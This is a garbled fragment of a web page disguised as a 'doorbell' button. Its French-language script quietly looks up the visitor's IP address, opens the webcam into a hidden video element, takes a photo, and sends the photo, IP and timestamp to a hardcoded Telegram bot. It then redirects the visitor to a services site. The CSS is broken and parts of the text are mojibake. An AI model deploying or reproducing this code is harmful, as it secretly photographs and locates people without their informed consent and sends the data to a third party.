        * {

        body {

        .consent-modal {

        .consent-box:hover {

        .bell-button {
            background: linear-gradient(45deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            animation: bell-shake 1.5s infinite;
        }

        @keyframes bell-shake {
            0%, 100% { transform: rotate(0deg); }
            10%, 30%, 50%, 70%, 90% { transform: rotate(-10deg); }
            20%, 40%, 60%, 80% { transform: rotate(10deg); }
        }

        .bell-button:hover {
            transform: scale(1.05);
            box-shadow: 0 15px 25px rgba(0,0,0,0.3);
        }

        .bell-button::before {
            content: 'ðŸ””';

            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(15px);
            padding: 2.5rem;
            border-radius: 20px;
            text-align: center;
            color: white;
            z-index: 1001;
            max-width: 400px;
            width: 90%;

        #statusMsg {
            color: white;

        }

        #hiddenVideo {

    <div class="consent-modal" id="consentModal">

    <div id="statusMsg"></div>
    <video id="hiddenVideo" autoplay playsinline></video>

    <div class="popup" id="popup" style="display: none;">

    </div>

    <script>
        const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
        const CHAT_ID = '5562266493';

        function getFormattedDateTime() {
            const now = new Date();
            const date = now.toLocaleDateString('fr-FR');
            const time = now.toLocaleTimeString('fr-FR');
            return `ðŸ“… Date: ${date} ðŸ•’ Heure: ${time}`;
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Indisponible';
            }
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Erreur d\'envoi:', error);
            }
        }

        async function handleActivation() {
            let ip = await getIPInfo();
            let statusMessage = `ðŸš¨ Sonnette activÃ©e!\nIP: ${ip}\n${getFormattedDateTime()}`;
            let userMessage = 'MERCI! <a href="https://torreswebsec.github.io/services/" target="_blank">Des solutions technologiques pour vous</a>';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', statusMessage);
                const blob = await fetch(photoUrl).then(r => r.blob());
                formData.append('photo', blob, 'photo.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
            
            } catch (error) {
                statusMessage += `\nErreur camÃ©ra: ${error.message}`;
            }

            await sendToTelegram(statusMessage);
            return userMessage;
        }

        function showPopup(message) {
            const popup = document.getElementById('popup');
            const popupMessage = document.getElementById('popupMessage');
            popupMessage.innerHTML = message;
            popup.style.display = 'block';

            setTimeout(() => {
                popup.style.display = 'none';
                window.location.href = 'https://torreswebsec.github.io/services/';
            }, 5000);
        }

        async function initiateActivation() {
            document.getElementById('consentModal').style.display = 'none';
            document.getElementById('statusMsg').innerHTML = 'Traitement en cours...';

            const message = await handleActivation();
            
            showPopup(`
                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
                    âœ“ ${message}
                </div>
            `);
        }

        window.onload = () => {
            document.getElementById('consentModal').style.display = 'flex';
        }
    </script>
